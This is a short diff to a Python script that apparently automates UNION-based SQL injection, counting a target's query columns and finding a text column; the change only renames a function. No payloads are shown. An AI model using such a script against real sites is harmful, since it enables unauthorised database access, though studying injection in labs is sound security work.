@@ -23,7 +23,7 @@ def get_exploit_column_number(url):
             return number - 1
     raise ValueError("Max number of tries exceeded, 50")
 
-def get_exploit_sqli_string_field(
+def get_exploit_string_field(
         url,
         column_number, 
         string_to_retrieve):
@@ -51,7 +51,7 @@ if __name__ == "__main__":
         print("[+] Figuring out number of columns...")
         column_number = get_exploit_column_number(url)
         print("[+] The number of columns is " + str(column_number) + "." )
-        string_column_number = get_exploit_sqli_string_field(url, column_number, string_to_retrieve)
+        string_column_number = get_exploit_string_field(url, column_number, string_to_retrieve)
         print("[+] The column that contains text is " + str(string_column_number) + ".")
     except IndexError:
         print("[-] Usage: %s <url>" % sys.argv[0])
